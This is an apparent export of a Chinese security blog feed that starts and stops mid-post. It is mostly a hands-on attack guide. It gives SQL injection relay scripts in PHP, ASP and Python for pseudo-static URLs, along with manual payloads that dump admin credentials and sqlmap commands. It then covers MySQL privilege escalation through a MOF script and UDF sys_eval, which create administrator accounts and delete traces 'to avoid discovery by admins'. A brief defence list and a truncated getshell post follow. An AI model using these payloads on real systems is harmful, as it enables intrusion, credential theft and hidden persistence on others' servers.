href="http://www.xxx.com/news.php?id=1%E5%81%9A%E4%BA%86%E4%BC%AA%E9%9D%99%E6%80%81%E4%B9%8B%E5%90%8E%E5%B0%B1%E6%88%90%E8%BF%99%E6%A0%B7%E4%BA%86">http://www.xxx.com/news.php?id=1做了伪静态之后就成这样了</a></p><p><a href="http://www.xxx.com/news.php/id/1.html">http://www.xxx.com/news.php/id/1.html</a></p><p>2.测试步骤：</p><p>中转注入的php代码:inject.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);  <br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>];  <br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">str_replace</span>(” “,”%<span class="hljs-number">20</span>″,<span class="hljs-variable">$id</span>);  <br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">str_replace</span>(“=”,”%<span class="hljs-number">3</span>D”,<span class="hljs-variable">$id</span>);  <br><span class="hljs-comment">//$url = &quot;http://www.xxx.com/news.php/id/$id.html&quot;;  </span><br><span class="hljs-variable">$url </span>= <span class="hljs-string">&quot;http://www.xxx.com/news.php/id/<span class="hljs-subst">$id</span>.html&quot;</span>;  <br><span class="hljs-comment">//echo $url;  </span><br>   <br><span class="hljs-variable">$ch </span>= <span class="hljs-title function_ invoke__">curl_init</span>();  <br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-string">&quot;<span class="hljs-subst">$url</span>&quot;</span>);  <br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);  <br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);  <br>   <br><span class="hljs-variable">$output </span>= <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);  <br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);  <br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$output</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>3.本地环境搭建PHP，然后访问<a href="http://127.0.0.1/inject.php?id=1">http://127.0.0.1/inject.php?id=1</a></p><p>通过sqlmap或者havj可以跑注入漏洞。</p><p><strong>附录ASP中转代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs asp">&lt;strong&gt;&lt;font style=&quot;font-size: 12pt&quot;&gt;&lt;code id=&quot;code1&quot;&gt;&lt;%  <br>JmdcwName=request(&quot;id&quot;)  <br>JmStr=JmdcwName  <br>JmStr=URLEncoding(JmStr)  <br>JMUrl=&quot;http://192.168.235.7:8808/ad/blog/&quot;  //实际上要请求的网址  <br>JMUrl=JMUrl &amp; JmStr&amp;&quot;.html&quot;    //拼接url  <br>response.write JMUrl&amp;JmStr    //我这里故意输出url来看  <br>&#x27;JmRef=&quot;http://127.0.0.1/6kbbs/bank.asp&quot;  <br>JmCok=&quot;&quot;  <br>JmCok=replace(JmCok,chr(32),&quot;%20&quot;)  <br>JmStr=URLEncoding(JmStr)    <br>  <br>response.write  PostData(JMUrl,JmStr,JmCok,JmRef) //url,查询字符串，cookie，referer字段  <br>  <br>Function PostData(PostUrl,PostStr,PostCok,PostRef)    <br>Dim Http  <br>Set Http = Server.CreateObject(&quot;msxml2.serverXMLHTTP&quot;)  <br>With Http  <br>.Open &quot;GET&quot;,PostUrl,False  <br>.Send ()  <br>PostData = .ResponseBody  <br>End With  <br>Set Http = Nothing  <br>PostData =bytes2BSTR(PostData)  <br>End Function  <br>  <br>  <br>Function bytes2BSTR(vIn)   //处理返回的信息  <br>Dim strReturn  <br>Dim I, ThisCharCode, NextCharCode  <br>strReturn = &quot;&quot;  <br>For I = 1 To LenB(vIn)  <br>ThisCharCode = AscB(MidB(vIn, I, 1))  <br>If ThisCharCode &lt; &amp;H80 Then  <br>strReturn = strReturn &amp; Chr(ThisCharCode)  <br>Else  <br>NextCharCode = AscB(MidB(vIn, I + 1, 1))  <br>strReturn = strReturn &amp; Chr(CLng(ThisCharCode) * &amp;H100 + CInt(NextCharCode))  <br>I = I + 1  <br>End If  <br>Next  <br>bytes2BSTR = strReturn  <br>End Function  <br>  <br>Function URLEncoding(vstrin)    //发包前对参数的url编码一下  <br>strReturn=&quot;&quot;  <br>Dim i  <br>&#x27;vstrin=replace(vstrin,&quot;%&quot;,&quot;%25&quot;) &#x27;增加转换搜索字符,  <br>&#x27;vstrin=Replace(vstrin,chr(32),&quot;%20&quot;) &#x27;转换空格,如果网站过滤了空格,尝试用/**/来代替%20  <br>&#x27;vstrin=Replace(vstrin,chr(43),&quot;%2B&quot;)  &#x27;JMDCW增加转换+字符  <br>vstrin=Replace(vstrin,chr(32),&quot;/**/&quot;)  &#x27;在此增加要过滤的代码 //这里很关键，方便啊，把空格自动换成/**/，后面会说到的  <br>For i=1 To Len(vstrin)  <br>ThisChr=Mid(vstrin,i,1)  <br>if Abs(Asc(ThisChr))&lt; &amp;HFF Then  <br>strReturn=strReturn &amp; ThisChr  <br>Else  <br>InnerCode=Asc(ThisChr)  <br>If InnerCode&lt;0 Then  <br>InnerCode=InnerCode + &amp;H10000  <br>End If  <br>Hight1=(InnerCode And &amp;HFF00) \&amp;HFF  <br>Low1=InnerCode And &amp;HFF  <br>strReturn=strReturn &amp; &quot;%&quot; &amp; Hex(Hight1) &amp; &quot;%&quot; &amp; Hex(Low1)  <br>End if  <br>Next  <br>URLEncoding=strReturn  <br>End Function  <br>  <br>%&gt;&lt;/code&gt;&lt;/font&gt;&lt;/strong&gt;<br></code></pre></td></tr></table></figure><h3 id="二、手工注入法"><a href="#二、手工注入法" class="headerlink" title="二、手工注入法"></a>二、手工注入法</h3><p>1.<a href="http://www.xxx.com/play/Diablo.html">http://www.xxx.com/play/Diablo.html</a></p><p><code>http://www.xxx.com/down/html/?772.html</code></p><p>2.测试注入：</p><p><code>http://www.xxx.com/down/html/?772′.html</code></p><p><code>http://www.xxx.com /play/Diablo&#39;.html</code></p><p><code>http://www.xxx.com/play/Diablo&#39;/**/and /**/1=&#39;1 /*.html</code></p><p><code>http://www.xxx.com/play/Diablo&#39; /**/and /**/1=&#39;2 /*.html</code></p><p><code>http://www.xxx.com/page/html/?56′/**/and/**/1=1/*.html </code>正常</p><p><code>http://www.xxx.com/page/html/?56′/**/and/**/1=2/*.html </code>出错</p><p>3.看页面是否存在差异，相同则不存在，不同存在注入。</p><p>4.联合查询：</p><p><code>http://www.xxx.com/play/diablo’ and 1=2 union select 1,2… frominformation_schema.columns where 1=&#39;1.html</code></p><p><code>http://www.xxx.com/page/html/?56&#39;/**/and/**/(SELECT/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)_2),(substring((select(version())),1,62)))a/**/from/**/information_schema.tables/**/group/**/by/**/a)b)=1/_.html</code></p><p>三、手工注入法（二）</p><p><code>http://www.xxx.net/news/html/?410.html</code></p><p><code>http://www.xxx.net/news/html/?410&#39;union/**/select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a,(select/**/concat(user,0x3a,password)/**/from/**/pwn_base_admin/**/limit/**/0,1),0x3a)a/**/from/**/information_schema.tables/**/group/**/by/**/a)b/**/where&#39;1&#39;=&#39;1.html</code></p><p>注：</p><p>伪静态的注入和URL的普通GET注入不太相同 。普通url的get注入的%20,%23,+等都可以用；但是伪静态不行，会被直接传递到到url中，所以用&#x2F;**&#x2F;这个注释符号表示空格。</p><h3 id="三、SQLmap方法"><a href="#三、SQLmap方法" class="headerlink" title="三、SQLmap方法"></a>三、SQLmap方法</h3><p>在sqlmap中伪静态哪儿存在注入点就加*</p><p><code>http://www.cunlide.com/id1/1/id2/2 python  sqlmap.py -u “http://www.xxx.com/id1/1*/id2/2″</code></p><p><code>http://www.xxx.com/news/class/?103.htm</code></p><p><code>python sqlmap.py -u “http://www.xxx.com/news/class/?103*.html”</code></p><h3 id="四、python脚本方法"><a href="#四、python脚本方法" class="headerlink" title="四、python脚本方法"></a>四、python脚本方法</h3><p>代码一：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;code <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;code3&quot;</span>&gt;<span class="hljs-keyword">from</span> BaseHTTPServer <span class="hljs-keyword">import</span> *  <br><span class="hljs-keyword">import</span> urllib2  <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHTTPHandler</span>(<span class="hljs-title class_ inherited__">BaseHTTPRequestHandler</span>):  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_GET</span>(<span class="hljs-params">self</span>):  <br>path=self.path  <br>path=path[path.find(<span class="hljs-string">&#x27;id=&#x27;</span>)+<span class="hljs-number">3</span>:]  <br>proxy_support = urllib2.ProxyHandler(&#123;<span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;http://127.0.0.1:8087&quot;</span>&#125;)  <br>opener = urllib2.build_opener(proxy_support)  <br>urllib2.install_opener(opener)  <br>url=<span class="hljs-string">&quot;http://www.xxx.com/magazine/imedia/gallery/dickinsons-last-dance/&quot;</span>  <br><span class="hljs-keyword">try</span>:  <br>response=urllib2.urlopen(url+path)  <br>html=response.read()  <br><span class="hljs-keyword">except</span> urllib2.URLError,e:  <br>html=e.read()  <br>self.wfile.write(html)  <br>server = HTTPServer((<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">8000</span>), MyHTTPHandler)  <br>server.serve_forever()&lt;/code&gt;<br></code></pre></td></tr></table></figure><h1 id="SQLMAP使用"><a href="#SQLMAP使用" class="headerlink" title="SQLMAP使用"></a>SQLMAP使用</h1><h1 id="SQL提权"><a href="#SQL提权" class="headerlink" title="SQL提权"></a>SQL提权</h1><h2 id="MySQL提权的必要条件："><a href="#MySQL提权的必要条件：" class="headerlink" title="MySQL提权的必要条件："></a><strong>MySQL提权的必要条件：</strong></h2><ol><li><strong>具有MySQL的root权限，且MySQL以system权限运行。</strong></li><li><strong>具有执行SQL语句的权限。</strong></li></ol><p><strong>获取root密码的方法：</strong></p><ol><li><p>查看数据库配置文件</p><p>关键字：<code>config</code>、<code>conn</code>、<code>sql</code>、<code>data</code>、<code>inc</code>、<code>database</code>等</p></li><li><p>下载mysql安装路径下的数据文件</p><ul><li>安装路径下的data目录中存放的是数据库的数据信息</li><li>root账号密码存储在mysql数据库下的user表中</li><li>完整路径&#x3D;安装路径+<code>\data\mysql\user.MYD</code></li></ul></li><li><p>暴力破解</p></li></ol><h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><p><strong>原理</strong></p><p>利用了<code>C:\Windows\System32\wbem\MOF</code>目录下的<code>nullevt.mof</code>文件</p><p>利用该文件每分钟会去执行一次的特性，向该文件中写入cmd命令，就会被执行</p><p><strong>利用条件</strong></p><ol><li>只使用于windows系统，一般低版本系统才可以用，比如<code>xp</code>、<code>server2003</code></li><li>对<code>C:\Windows\System32\wbem\MOF</code>目录有读写权限</li><li>可以找到一个可写目录，写入mof文件</li></ol><p><strong>提权方法</strong></p><ol><li><p>在可写目录中上传mof文件。</p><p>把mof文件上传到<code>C:/wmpub/nullevt.mof</code></p></li><li><p>把这个文件复制到<code>C:/Windows/System32/wbem/MOF/nullevt.mof</code>目录下</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&#x27;C:/wmpub/nullevt.mof&#x27;</span>) <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;C:/Windows/System32/wbem/MOF/nullevt.mof&#x27;</span><br></code></pre></td></tr></table></figure><p>将下面这段代码复制到mof后缀的文件中</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs smali"><br><span class="hljs-comment"># pragma namespace(&quot;\.\root\subscription&quot;)</span><br><span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of EventFilter as $EventFilter&#123; EventNamespace =<span class="hljs-string">&quot;Root\Cimv2&quot;</span>; Name = <span class="hljs-string">&quot;filtP2&quot;</span>; Query = <span class="hljs-string">&quot;Select * From InstanceModificationEvent &quot;</span><br><br><span class="hljs-string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="hljs-string">&quot; &quot;</span><br><br><span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>;<br><br>Query<span class="hljs-class">Language = &quot;WQL&quot;;</span><br><br>&#125;;<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of ActiveScriptEventConsumer as $Consumer<br><br>&#123;<br><br>Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>;<br><br>ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>;<br><br>ScriptText =<br><br><span class="hljs-string">&quot;var WSH = new</span><br><span class="hljs-string"></span><br><span class="hljs-string">ActiveXObject(\&quot;</span>WScript.Shell\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe user admin admin /add<span class="hljs-string">&quot;)&quot;</span>;<br><br>&#125;;<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of __FilterToConsumerBinding<br><br>&#123;<br><br>Consumer = $Consumer;<br><br>Filter = $EventFilter;<br><br>&#125;;<br></code></pre></td></tr></table></figure><p>把这个mof文件上传到目标机中，可以修改代码，进行命令执行。</p><p>目前mof提权方法用的比较少，建议使用udf脚本进行MySQL数据库提权。</p></li></ol><p><strong>补救措施</strong></p><p>当发现服务器被使用mof提权，解决继续执行系统命令的方法：</p><ol><li>先停止winmgmt服务：<code>net stop winmgmt</code></li><li>删除文件夹：<code>C:\Windows\System32\wbem\Repository</code></li><li>再重新启动winmgmt服务：<code>net start winmgmt</code></li></ol><h3 id="UDF提权-用户自定义函数提权"><a href="#UDF提权-用户自定义函数提权" class="headerlink" title="UDF提权(用户自定义函数提权)"></a>UDF提权(用户自定义函数提权)</h3><p><strong>原理</strong></p><p>UDF(User Defined Funtion)用户自定义函数，通过添加新的函数，对mysql服务器进行功能扩充。</p><p><strong>信息收集</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">version</span>()</span>;   <span class="hljs-meta"># 获取数据库版本</span><br><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">user</span>()</span>;  <span class="hljs-meta"># 获取数据库用户</span><br><span class="hljs-keyword">select</span> @@basedir;   <span class="hljs-meta"># 获取数据库安装目录</span><br>show variables like ‘%plugin%’; <span class="hljs-meta"># 查看plugin路径。</span><br></code></pre></td></tr></table></figure><h4 id="Windows-UDF提权"><a href="#Windows-UDF提权" class="headerlink" title="Windows UDF提权"></a>Windows UDF提权</h4><p>UDF可以理解为MySQL的函数库，可以利用udf定义的创建函数。想要利用udf，必须上传udf.dll作为udf的执行库。MySQL中支持UDF扩展，使得我们可以调用DLL里面的函数来实现一些特殊的功能。</p><p><strong>利用条件</strong></p><p>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的<code>MySQL\Lib\Plugin\</code>文件夹下，该目录默认是不存在的，需要使用webshell找到mysql的安装目录，并在安装目录下创建<code>MySQL\Lib\Plugin\</code>文件夹，然后将udf.dll导入到该目录。</p><p>如果mysql版本小于5.1，udf.dll文件在windows server 2003下放置于<code>c:/windows/system32/</code>目录，在windows server 2000下放置在<code>c:/winnt/system32/</code>目录。</p><p>掌握mysql数据库的root账户，从而拥有对mysql的insert和delete权限，以创建和抛弃函数。</p><p>拥有可以将udf.dll写入相应目录的权限。</p><p><strong>基本步骤</strong></p><p><strong>DLL文件的获取方法</strong></p><p>在<code>sqlmap/data/udf/mysql</code>目录下，在Windows目录中有32位和64位的dll文件（MySQL位数）。</p><p>文件夹中的dll文件是通过异或编码的，可以使用<code>sqlmap/extract/cloak.py</code>进行解码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python <span class="hljs-regexp">/sqlmap/</span>extra<span class="hljs-regexp">/cloak/</span>cloak.py -d -i <span class="hljs-regexp">/sqlmap/u</span>df<span class="hljs-regexp">/mysql/</span>windows<span class="hljs-regexp">/64/</span>lib_mysqludf_sys.dll_<br></code></pre></td></tr></table></figure><ol><li><p>将解码后的DLL文件（包含用户自定义函数的DLL文件）上传到可写目录，再导入到<code>MySQL\lib\plugin\</code>中</p><p><code>select LOAD_FILE(&#39;C:/可写目录/lib_mysqludf_sys.dll&#39;) into dumpfile &#39;C:/phpStudy2016/MySQL/lib/plugin/lib_mysqludf_sys.dll&#39;;</code></p></li><li><p>将DLL中的函数引入到MySQL数据库中</p><p>创建自定义函数</p><p><code>create function sys_eval returns string soname &#39;lib_mysqludf_sys.dll&#39;;</code></p><p>创建名为sys_eval的函数，返回值为string类型，调用的文件是lib_mysqludf_sys.dll</p><p>注意：需要创建.dll文件中存在的函数，可以使用十六进制编辑器打开.dll文件，查看可以被创建的函数。</p></li><li><p>使用该函数去执行系统命令提权</p><p>查看当前用户权限</p><p><code>select sys_eval(&quot;whoami&quot;);</code></p><p>创建账号并提升为管理员权限</p><p><code>select sys_eval(&quot;net user winhex passw@ord /add&quot;);</code></p><p><code>select sys_eval(&quot;net localgroup administrators winhex /add&quot;);</code></p></li><li><p>将之前引入的函数删除掉</p><p>防止被管理员发现，防止其他攻击者使用</p><p><code>drop function sys_eval;</code></p><p><code>delete from mysql.func where name=&#39;sys_eval&#39;;</code></p></li></ol><h4 id="Linux-UDF提权"><a href="#Linux-UDF提权" class="headerlink" title="Linux UDF提权"></a>Linux UDF提权</h4><p><strong>简述</strong></p><p>通过自定义库函数来实现执行任意的命令</p><p>包含用户自定义函数的文件为.so文件</p><p><strong>要求</strong></p><ul><li>在my.ini的[mysqld]下，添加secure_file_priv&#x3D;””，不限制导入导出路径</li><li>具有数据库root账户的密码，且mysql数据库以root权限运行</li><li>具有sql语句的执行权限</li><li>导出目录可写</li><li>系统中的selinux处于关闭状态</li></ul><p><strong>提权过程</strong></p><ol><li><p>查找插件库的路径</p><p><code>show variables like &#39;%plugin%&#39;;</code></p><p>得到的结果为：</p><table><thead><tr><th align="center">Variable_name</th><th align="center">Value</th></tr></thead><tbody><tr><td align="center">plugin_dir</td><td align="center">&#x2F;usr&#x2F;lib64&#x2F;mysql&#x2F;plugin</td></tr></tbody></table></li><li><p>找到对应操作系统数据库的UDF库文件</p><p><code>sqlmap-master\data\udf\mysql\linux\64</code>下的<code>lib_mysqludf_sys.so_</code>文件</p></li><li><p>将so文件（UDF库文件）进行16进制编码</p></li><li><p>将so文件的内容解码，写入到mysql插件库目录中</p><p><code>select unhex(&#39;so文件的16进制编码&#39;) into dumpfile &#39;/usr/lib64/mysql/plugin/xxx.so&#39;</code></p></li><li><p>查看udf库所支持的函数</p><p>注意：需要创建.so文件中存在的函数，可以使用十六进制编辑器打开.so文件，查看可以被创建的函数。</p></li><li><p>创建函数</p><p>写入之后，执行创建函数的命令，就会创建一个sys_eval的函数，用来执行系统命令，这个函数执行的系统命令全部都是system权限。</p><p><code>create function sys_eval returns string soname &#39;xxx.so&#39;;</code></p></li><li><p>执行系统命令，提权</p><p><code>sys_eval</code>这个函数就可以执行系统命令，括号里输入系统命令即可。</p><p>查看当前用户权限</p><p><code>select sys_eval(&quot;whoami&quot;);</code></p><p>创建账号并提升为管理员权限</p></li></ol><p>不需要判断mysql的版本，直接查看路径，直接写so文件，Linux里面的文件是so文件。</p><p>getshell之后，在终端输入whoami，发现只是apache用户权限。</p><p>寻找网站的数据库配置文件，查看数据库的账号密码，可以看到账号root密码root。</p><p>登录mysql数据库，输入<code>show variables like &#39;%plugin%&#39;;</code>查看plugin路径。</p><p>得到的结果为：</p><table><thead><tr><th align="center">Variable_name</th><th align="center">Value</th></tr></thead><tbody><tr><td align="center">plugin_dir</td><td align="center">&#x2F;usr&#x2F;lib64&#x2F;mysql&#x2F;plugin</td></tr></tbody></table><p>我们把so文件进行16进制编码，再解码写入目录中，返回为true，写入成功。</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">select</span> unhex(<span class="hljs-string">&#x27;so文件的16进制编码&#x27;</span>) <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;/usr/lib64/mysql/plugin/xxx.so&#x27;</span><br></code></pre></td></tr></table></figure><p>写入之后，执行创建函数的命令，就会创建一个sys_eval的函数，用来执行系统命令，这个函数执行的系统命令全部都是system权限。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval returns <span class="hljs-keyword">string</span> soname <span class="hljs-string">&#x27;xxx.so&#x27;</span>;<br></code></pre></td></tr></table></figure><p><code>sys_eval</code>这个函数就可以执行系统命令，括号里输入系统命令即可。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">select</span> <span class="hljs-function"><span class="hljs-title">sys_eval</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)</span><br></code></pre></td></tr></table></figure><h3 id="开机启动项提权"><a href="#开机启动项提权" class="headerlink" title="开机启动项提权"></a>开机启动项提权</h3><p>利用MySQL，将后门写入开机启动项。同时因为是开机自启动，在写入之后，需要重启目标服务器，才可以运行。</p><h1 id="SQL注入的防御"><a href="#SQL注入的防御" class="headerlink" title="SQL注入的防御"></a>SQL注入的防御</h1><p>1.不信任用户的输入，对用户的输入进行校验，例如通过正则表达式，限制长度，对单引号双引号进行转换等<br>2.不使用动态拼接sql，考虑使用存储过程进行数据查询存储<br>3.应用异常信息应给出尽可能少的提示，最好使用自定义错误信息<br>4.不使用管理员权限的数据库连接，为每个应用使用单独的权限，有限的数据库连接<br>5.不把机密信息直接存放，对敏感信息进行加密</p><p>系统内核溢出漏洞提权、数据库提权、错误的系统配置提权、组策略首选项提权、WEB中间件漏洞提权、DLL劫持提权、滥用高危权限令牌提权、第三方软件&#x2F;服务提权等</p>]]></content>
    
    
    <categories>
      
      <category>TOP10</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>TOP10</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>getshell手法小记</title>
    <link href="/2024/11/11/getshell%E6%89%8B%E6%B3%95/"/>
    <url>/2024/11/11/getshell%E6%89%8B%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808848.png" alt="image.png"><br>这里挑选最简单的数字型sql注入进行学习<br>这里的漏洞点就发生在query中<br><code>$query=&quot;select username,email from member where id=$id&quot;;</code><br>这里存在sql注入漏洞的原因是：这里的id我们是可控的，没有进行任何过滤，会直接通过execute执行sql语句<br>我们单独把这个sql语句拿出来看看<br><code>select username,email from member where id=$id</code><br>当id值为1时<br>它的语句就是<br><code>select username,email from member where id=1</code><br>我们看看它的结果<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808788.png" alt="image.png"><br>我们看到了正常的内容，且与我们直接在mysql中执行sql语句看到的内容一样<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808839.png" alt="image.png"><br>在sql查询中，有union select这一操作符，通过这一操作符，我们可以实现合并两个或多个 SELECT 语句的结果<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808842.png" alt="image.png"><br>可以看到，我们这样就能查询到1，2<br>但是在网页上我们只能看到第一行的结果，这时我们有两个选择，一个是将id设置为一个不存在的值，可以是-1，0，又或是像10086这样足够大的值，前提是我们知道这个值代表的列在数据库中为空<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808846.png" alt="image.png"><br>这样我们就能在第一行看到我们想要的内容<br>第二种选择，是通过limit的方式，跳过第一行，从第二行开始显示<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808845.png" alt="image.png"><br>当然我说的是我平时遇到的常规情况，但我发现这个靶场似乎可以同时显示两个数据<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808858.png" alt="image.png"><br>那么，我们就可以通过union select的方式，去查询数据库的一些敏感信息，比如数据库名称，数据库版本，数据库用户名等等<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808924.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808971.png" alt="image.png"><br>至此我们学会了php中最基本的sql注入<br>当然这是最简单的理想情况，我们还需要看他有没有预编译，过滤之类的，因为是红队课，我们的目标肯定是getshell<br>这里再写下如何通过sql注入getshell</p><h4 id="outfile和dumpfile写shell"><a href="#outfile和dumpfile写shell" class="headerlink" title="outfile和dumpfile写shell"></a>outfile和dumpfile写shell</h4><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><p>过滤了单引号into outfile还能用吗？不能，GPC要off才行，可以测试Hex编码</p><blockquote><ol><li>数据库当前用户为root权限；</li><li>知道当前网站的绝对路径；</li><li><code>PHP</code>的<code>GPC</code>为 off状态；(魔术引号，GET，POST，Cookie)</li><li>写入的那个路径存在写入权限。</li></ol></blockquote><h6 id="基于UNION联合查询："><a href="#基于UNION联合查询：" class="headerlink" title="基于UNION联合查询："></a><strong>基于UNION联合查询</strong>：</h6><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?id=1 UNION ALL SELECT 1,&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ 